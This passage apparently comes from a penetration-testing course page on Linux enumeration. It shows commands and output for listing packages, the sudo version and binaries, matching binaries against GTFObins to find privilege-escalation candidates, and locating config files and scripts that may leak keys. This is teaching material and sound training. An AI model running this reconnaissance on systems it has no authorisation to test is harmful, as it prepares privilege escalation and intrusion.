accountsservice-ubuntu-schemas <span class="hljs-number">0.0</span><span class="hljs-meta">.7</span>+<span class="hljs-number">17.10</span><span class="hljs-meta">.20170922</span>-0ubuntu1                                                          
accountsservice <span class="hljs-number">0.6</span><span class="hljs-meta">.55</span>-0ubuntu12~<span class="hljs-number">20.04</span><span class="hljs-meta">.5</span>                   
acl <span class="hljs-number">2.2</span><span class="hljs-meta">.53</span>-<span class="hljs-number">6</span>                                               
acpi-support <span class="hljs-number">0.143</span>                                         
acpid <span class="hljs-number">2.0</span><span class="hljs-meta">.32</span>-1ubuntu1                                      
adduser <span class="hljs-number">3.</span>118ubuntu2                                       
adwaita-icon-theme <span class="hljs-number">3.36</span><span class="hljs-meta">.1</span>-2ubuntu0<span class="hljs-meta">.20</span><span class="hljs-meta">.04</span><span class="hljs-meta">.2</span>                 
alsa-base <span class="hljs-number">1.0</span><span class="hljs-meta">.25</span>+dfsg-0ubuntu5                             
alsa-topology-conf <span class="hljs-number">1.2</span><span class="hljs-meta">.2</span>-<span class="hljs-number">1</span>                                                                                            
alsa-ucm-conf <span class="hljs-number">1.2</span><span class="hljs-meta">.2</span>-1ubuntu0<span class="hljs-meta">.13</span>                            
alsa-utils <span class="hljs-number">1.2</span><span class="hljs-meta">.2</span>-1ubuntu2<span class="hljs-meta">.1</span>                                                                                           
amd64-microcode <span class="hljs-number">3.20191218</span>.1ubuntu1
anacron <span class="hljs-number">2.3</span>-<span class="hljs-number">29</span>
apg <span class="hljs-number">2.2</span><span class="hljs-meta">.3</span>.dfsg<span class="hljs-meta">.1</span>-<span class="hljs-number">5</span>
app-install-data-partner <span class="hljs-number">19.04</span>
apparmor <span class="hljs-number">2.13</span><span class="hljs-meta">.3</span>-7ubuntu5<span class="hljs-meta">.1</span>
apport-gtk <span class="hljs-number">2.20</span><span class="hljs-meta">.11</span>-0ubuntu27<span class="hljs-meta">.24</span>
apport-symptoms <span class="hljs-number">0.23</span>
apport <span class="hljs-number">2.20</span><span class="hljs-meta">.11</span>-0ubuntu27<span class="hljs-meta">.24</span>
appstream <span class="hljs-number">0.12</span><span class="hljs-meta">.10</span>-<span class="hljs-number">2</span>
apt-config-icons-hidpi <span class="hljs-number">0.12</span><span class="hljs-meta">.10</span>-<span class="hljs-number">2</span>
apt-config-icons <span class="hljs-number">0.12</span><span class="hljs-meta">.10</span>-<span class="hljs-number">2</span>
apt-utils <span class="hljs-number">2.0</span><span class="hljs-meta">.9</span>
...SNIP...
</code></pre>
<p>It&#39;s also a good idea to check if the <code>sudo</code> version installed on the system is vulnerable to any legacy or recent exploits.</p>
<p><strong>Sudo Version</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo -V

Sudo version <span class="hljs-number">1.8</span><span class="hljs-number">.31</span>
Sudoers policy plugin version <span class="hljs-number">1.8</span><span class="hljs-number">.31</span>
Sudoers file grammar version <span class="hljs-number">46</span>
Sudoers I/O plugin version <span class="hljs-number">1.8</span><span class="hljs-number">.31</span>
</code></pre>
<p>Occasionally it can also happen that no direct packages are installed on the system but compiled programs in the form of binaries. These do not require installation and can be executed directly by the system itself.</p>
<p><strong>Binaries</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/

lrwxrwxrwx<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 7 </span>Oct<span class="hljs-number"> 27 </span>11:14 /bin -&gt; usr/bin

/usr/bin/:
total 175160
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 31248 </span>May<span class="hljs-number"> 19 </span><span class="hljs-number"> 2020 </span> aa-enabled
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 35344 </span>May<span class="hljs-number"> 19 </span><span class="hljs-number"> 2020 </span> aa-exec
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 22912 </span>Apr<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span> aconnect
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 19016 </span>Nov<span class="hljs-number"> 28 </span><span class="hljs-number"> 2019 </span> acpi_listen
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root       <span class="hljs-number"> 7415 </span>Oct<span class="hljs-number"> 26 </span><span class="hljs-number"> 2021 </span> add-apt-repository
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 30952 </span>Feb <span class="hljs-number"> 7 </span><span class="hljs-number"> 2022 </span> addpart
lrwxrwxrwx<span class="hljs-number"> 1 </span>root root         <span class="hljs-number"> 26 </span>Oct<span class="hljs-number"> 20 </span><span class="hljs-number"> 2021 </span> addr2line -&gt; x86_64-linux-gnu-addr2line
...SNIP...

/usr/sbin/:
total 32500
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 3068 </span>Mai<span class="hljs-number"> 19 </span><span class="hljs-number"> 2020 </span>aa-remove-unknown
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 8839 </span>Mai<span class="hljs-number"> 19 </span><span class="hljs-number"> 2020 </span>aa-status
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 139 </span>Jun<span class="hljs-number"> 18 </span><span class="hljs-number"> 2019 </span>aa-teardown
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 14728 </span>Feb<span class="hljs-number"> 25 </span><span class="hljs-number"> 2020 </span>accessdb
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 60432 </span>Nov<span class="hljs-number"> 28 </span><span class="hljs-number"> 2019 </span>acpid
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 3075 </span>Jul <span class="hljs-number"> 4 </span>18:20 addgnupghome
lrwxrwxrwx<span class="hljs-number"> 1 </span>root root        <span class="hljs-number"> 7 </span>Okt<span class="hljs-number"> 27 </span>11:14 addgroup -&gt; adduser
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root      <span class="hljs-number"> 860 </span>Dez <span class="hljs-number"> 7 </span><span class="hljs-number"> 2019 </span>add-shell
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 37785 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>adduser
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 69000 </span>Feb <span class="hljs-number"> 7 </span><span class="hljs-number"> 2022 </span>agetty
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 5576 </span>Jul<span class="hljs-number"> 31 </span><span class="hljs-number"> 2015 </span>alsa
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root     <span class="hljs-number"> 4136 </span>Apr<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>alsabat-test
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 118176 </span>Apr<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>alsactl
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 26489 </span>Apr<span class="hljs-number"> 14 </span><span class="hljs-number"> 2021 </span>alsa-info
-rwxr-xr-x<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 39088 </span>Jul<span class="hljs-number"> 16 </span><span class="hljs-number"> 2019 </span>anacron
...SNIP...
</code></pre>
<p><a href="https://gtfobins.github.io/">GTFObins</a> provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.</p>
<p><strong>GTFObins</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">for</span> i <span class="hljs-built_in">in</span> $(curl -s https://gtfobins.github.io/ | <span class="hljs-type">html2text</span> | <span class="hljs-type">cut</span> -d<span class="hljs-string">" "</span> -f1 | <span class="hljs-type">sed</span> '/^[[:space:]]*$/d');<span class="hljs-built_in">do</span> <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"$i"</span> installed_pkgs.list;<span class="hljs-keyword">then</span> echo <span class="hljs-string">"Check GTFO for: $i"</span>;fi;done

<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: ab                                         
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: apt                                        
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: ar                                         
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: <span class="hljs-built_in">as</span>         
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: ash                                        
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: aspell                                     
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: <span class="hljs-built_in">at</span>     
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: awk      
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: bash                                       
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: bridge
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: busybox
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: bzip2
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: cat
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: comm
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: cp
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: cpio
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: cupsfilter
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: curl
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: dash
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: date
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: dd
<span class="hljs-keyword">Check</span> GTFO <span class="hljs-keyword">for</span>: diff
</code></pre>
<p>We can use the diagnostic tool <code>strace</code> on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens.</p>
<p>The output of <code>strace</code> can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program&#39;s behavior.</p>
<p><strong>Trace System Calls</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ strace ping -c1 10.129.112.20

execve("/usr/bin/ping", ["ping", "-c1", "10.129.112.20"], 0x7ffdc8b96cc0 /* 80 vars */) = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
brk(NULL)                               = 0x56222584c000
arch_prctl(0x3001 /* ARCH_??? */, 0x7fffb0b2ea00) = -1 EINVAL (Invalid argument)
...SNIP...
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
...SNIP...
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libidn2.so.0", O_RDONLY|O_CLOEXEC) = 3
...SNIP...
read(3, "<span class="hljs-symbol">\1</span>77ELF<span class="hljs-symbol">\2</span><span class="hljs-symbol">\1</span><span class="hljs-symbol">\1</span><span class="hljs-symbol">\3</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span><span class="hljs-symbol">\0</span>&gt;<span class="hljs-symbol">\0</span><span class="hljs-symbol">\1</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>P<span class="hljs-symbol">\2</span>37<span class="hljs-symbol">\2</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>"..., 832) = 832
pread64(3, "<span class="hljs-symbol">\6</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\4</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>@<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>@<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>@<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>"..., 784, 64) = 784
pread64(3, "<span class="hljs-symbol">\4</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span> <span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\5</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>GNU<span class="hljs-symbol">\0</span><span class="hljs-symbol">\2</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span>00<span class="hljs-symbol">\4</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>"..., 48, 848) = 48
...SNIP...
socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP) = 3
socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6) = 4
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, NULL) = 0
capget({version=_LINUX_CAPABILITY_VERSION_3, pid=0}, {effective=0, permitted=0, inheritable=0}) = 0
openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache", O_RDONLY) = 5
...SNIP...
socket(AF_INET, SOCK_DGRAM, IPPROTO_IP) = 5
connect(5, {sa_family=AF_INET, sin_port=htons(1025), sin_addr=inet_addr("10.129.112.20")}, 16) = 0
getsockname(5, {sa_family=AF_INET, sin_port=htons(39885), sin_addr=inet_addr("10.129.112.20")}, [16]) = 0
close(5)                                = 0
...SNIP...
sendto(3, "<span class="hljs-symbol">\1</span>0<span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span>1<span class="hljs-symbol">\3</span>03<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\1</span>eX<span class="hljs-symbol">\3</span>27c<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span>30<span class="hljs-symbol">\2</span>54<span class="hljs-symbol">\n</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\2</span>0<span class="hljs-symbol">\2</span>1<span class="hljs-symbol">\2</span>2<span class="hljs-symbol">\2</span>3<span class="hljs-symbol">\2</span>4<span class="hljs-symbol">\2</span>5<span class="hljs-symbol">\2</span>6<span class="hljs-symbol">\2</span>7"..., 64, 0, {sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, 16) = 64
...SNIP...
recvmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(0), sin_addr=inet_addr("10.129.112.20")}, msg_namelen=128 =&gt; 16, msg_iov=[{iov_base="<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span>!<span class="hljs-symbol">\3</span>00<span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\1</span>eX<span class="hljs-symbol">\3</span>27c<span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\3</span>30<span class="hljs-symbol">\2</span>54<span class="hljs-symbol">\n</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\0</span><span class="hljs-symbol">\2</span>0<span class="hljs-symbol">\2</span>1<span class="hljs-symbol">\2</span>2<span class="hljs-symbol">\2</span>3<span class="hljs-symbol">\2</span>4<span class="hljs-symbol">\2</span>5<span class="hljs-symbol">\2</span>6<span class="hljs-symbol">\2</span>7"..., iov_len=192}], msg_iovlen=1, msg_control=[{cmsg_len=32, cmsg_level=SOL_SOCKET, cmsg_type=SO_TIMESTAMP_OLD, cmsg_data={tv_sec=1675057253, tv_usec=699895}}, {cmsg_len=20, cmsg_level=SOL_IP, cmsg_type=IP_TTL, cmsg_data=[64]}], msg_controllen=56, msg_flags=0}, 0) = 64
write(1, "64 bytes from 10.129.112.20: icmp_se"..., 57) = 57
write(1, "<span class="hljs-symbol">\n</span>", 1)                       = 1
write(1, "--- 10.129.112.20 ping statistics --"..., 34) = 34
write(1, "1 packets transmitted, 1 receive"..., 60) = 60
write(1, "rtt min/avg/max/mdev = 0.287/0.2"..., 50) = 50
close(1)                                = 0
close(2)                                = 0
exit_group(0)                           = ?
+++ exited with 0 +++
</code></pre>
<p>Users can read almost all configuration files on a Linux operating system if the administrator has kept them the same. These configuration files can often reveal how the service is set up and configured to understand better how we can use it for our purposes. In addition, these files can contain sensitive information, such as keys and paths to files in folders that we cannot see. However, if the file has read permissions for everyone, we can still read the file even if we do not have permission to read the folder.</p>
<p><strong>Configuration Files</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; <span class="hljs-number">2</span>&gt;/dev/null

-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">448</span> Nov <span class="hljs-number">28</span> <span class="hljs-number">12</span>:<span class="hljs-number">31</span> /<span class="hljs-keyword">run</span><span class="bash">/tmpfiles.d/static-nodes.conf
</span>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">71</span> Nov <span class="hljs-number">28</span> <span class="hljs-number">12</span>:<span class="hljs-number">31</span> /<span class="hljs-keyword">run</span><span class="bash">/NetworkManager/resolv.conf
</span>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">72</span> Nov <span class="hljs-number">28</span> <span class="hljs-number">12</span>:<span class="hljs-number">31</span> /<span class="hljs-keyword">run</span><span class="bash">/NetworkManager/no-stub-resolv.conf
</span>-rw-r--r-- <span class="hljs-number">1</span> root root <span class="hljs-number">0</span> Nov <span class="hljs-number">28</span> <span class="hljs-number">12</span>:<span class="hljs-number">37</span> /<span class="hljs-keyword">run</span><span class="bash">/NetworkManager/conf.d/10-globally-managed-devices.conf
</span>-rw-r--r-- <span class="hljs-number">1</span> systemd-resolve systemd-resolve <span class="hljs-number">736</span> Nov <span class="hljs-number">28</span> <span class="hljs-number">12</span>:<span class="hljs-number">31</span> /<span class="hljs-keyword">run</span><span class="bash">/systemd/resolve/stub-resolv.conf
</span>-rw-r--r-- <span class="hljs-number">1</span> systemd-resolve systemd-resolve <span class="hljs-number">607</span> Nov <span class="hljs-number">28</span> <span class="hljs-number">12</span>:<span class="hljs-number">31</span> /<span class="hljs-keyword">run</span><span class="bash">/systemd/resolve/resolv.conf
</span>...SNIP...
</code></pre>
<p>The scripts are similar to the configuration files. Often administrators are lazy and convinced of network security and neglect the internal security of their systems. These scripts, in some cases, have such wrong privileges that we will deal with later, but the contents are of great importance even without these privileges. Because through them, we can discover internal and individual processes that can be of great use to us.</p>
<p><strong>Scripts</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ find /</span> -type f -name <span class="hljs-string">"*.sh"</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | grep -v <span class="hljs-string">"src\|snap\|share"</span>

<span class="hljs-regexp">/home/</span>htb-student/automation.sh
<span class="hljs-regexp">/etc/</span>wpa_supplicant/action_wpa.sh
<span class="hljs-regexp">/etc/</span>wpa_supplicant/ifupdown.sh
<span class="hljs-regexp">/etc/</span>wpa_supplicant/functions.sh
<span class="hljs-regexp">/etc/</span>init.d/keyboard-setup.sh
<span class="hljs-regexp">/etc/</span>init.d/console-setup.sh
<span class="hljs-regexp">/etc/</span>init.d/hwclock.sh
...SNIP...
</code></pre>
<p>Also, if we look at the process list, it can give us information about which scripts or binaries are in use and by which user. So, for example, if it is a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the <code>root</code> directory.</p>
<p><strong>Running Services by User</strong></p>
<p>Linux Services &amp; Internals Enumeration</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ ps aux | grep root

...SNIP...
root           1  2.0  0.2 168196 11364 ?        Ss   12:31   0:01 /sbin</span><span class="hljs-regexp">/init splash
root         378  0.5  0.4  62648 17212 ?        S&lt;s  12:31   0:00 /lib</span><span class="hljs-regexp">/systemd/systemd</span>-journald
root         <span class="hljs-number">409</span>  <span class="hljs-number">0.8</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">25208</span>  <span class="hljs-number">7832</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">systemd</span>/<span class="hljs-title">systemd</span>-<span class="hljs-title">udevd</span></span>
root         <span class="hljs-number">457</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span> <span class="hljs-number">150668</span>   <span class="hljs-number">284</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root         <span class="hljs-number">752</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.2</span>  <span class="hljs-number">58780</span> <span class="hljs-number">10608</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/bin/VGAuthService
root         <span class="hljs-number">755</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.1</span> <span class="hljs-number">248088</span>  <span class="hljs-number">7448</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/bin/vmtoolsd
root         <span class="hljs-number">772</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.2</span> <span class="hljs-number">250528</span>  <span class="hljs-number">9388</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">accountsservice</span>/<span class="hljs-title">accounts</span>-<span class="hljs-title">daemon</span></span>
root         <span class="hljs-number">773</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span>   <span class="hljs-number">2548</span>   <span class="hljs-number">768</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/acpid
root         <span class="hljs-number">774</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">16720</span>   <span class="hljs-number">708</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/anacron -d -q -s
root         <span class="hljs-number">778</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">18052</span>  <span class="hljs-number">2992</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/cron -f
root         <span class="hljs-number">779</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.2</span>  <span class="hljs-number">37204</span>  <span class="hljs-number">8964</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/cupsd -l
root         <span class="hljs-number">784</span>  <span class="hljs-number">0.4</span>  <span class="hljs-number">0.5</span> <span class="hljs-number">273512</span> <span class="hljs-number">21680</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/NetworkManager --no-daemon
root         <span class="hljs-number">790</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">81932</span>  <span class="hljs-number">3648</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/irqbalance --foreground
root         <span class="hljs-number">792</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">0.5</span>  <span class="hljs-number">48244</span> <span class="hljs-number">20540</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         <span class="hljs-number">793</span>  <span class="hljs-number">1.3</span>  <span class="hljs-number">0.2</span> <span class="hljs-number">239180</span> <span class="hljs-number">11832</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">policykit</span>-1/<span class="hljs-title">polkitd</span> --<span class="hljs-title">no</span>-<span class="hljs-title">debug</span></span>
root         <span class="hljs-number">806</span>  <span class="hljs-number">2.1</span>  <span class="hljs-number">1.1</span> <span class="hljs-number">1096292</span> <span class="hljs-number">44976</span> ?       Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">01</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">snapd</span>/<span class="hljs-title">snapd</span></span>
root         <span class="hljs-number">807</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.1</span> <span class="hljs-number">244352</span>  <span class="hljs-number">6516</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/libexec/switcheroo-control
root         <span class="hljs-number">811</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">0.2</span>  <span class="hljs-number">17412</span>  <span class="hljs-number">8112</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">systemd</span>/<span class="hljs-title">systemd</span>-<span class="hljs-title">logind</span></span>
root         <span class="hljs-number">817</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.3</span> <span class="hljs-number">396156</span> <span class="hljs-number">14352</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">udisks2</span>/<span class="hljs-title">udisksd</span></span>
root         <span class="hljs-number">818</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">13684</span>  <span class="hljs-number">4876</span> ?        Ss   <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         <span class="hljs-number">871</span>  <span class="hljs-number">0.1</span>  <span class="hljs-number">0.3</span> <span class="hljs-number">319236</span> <span class="hljs-number">13828</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/ModemManager
root         <span class="hljs-number">875</span>  <span class="hljs-number">0.0</span>  <span class="hljs-number">0.3</span> <span class="hljs-number">178392</span> <span class="hljs-number">12748</span> ?        Ssl  <span class="hljs-number">12</span>:<span class="hljs-number">31</span>   <span class="hljs-number">0</span>:<span class="hljs-number">00</span> /usr/sbin/cups-browsed
